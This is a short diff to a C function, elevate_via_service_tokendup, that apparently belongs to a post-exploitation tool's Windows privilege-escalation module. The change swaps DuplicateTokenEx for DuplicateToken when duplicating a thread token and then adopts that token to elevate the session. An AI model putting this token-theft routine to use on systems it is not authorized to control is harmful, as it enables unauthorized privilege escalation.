@@ -170,7 +170,8 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 				{
 					if( OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
 					{
-						if( DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup ) )
+
+						if( DuplicateToken( hToken, SecurityImpersonation, &hTokenDup ) )
 						{
 							core_update_thread_token( remote, hTokenDup );
 							dwResult = ERROR_SUCCESS;
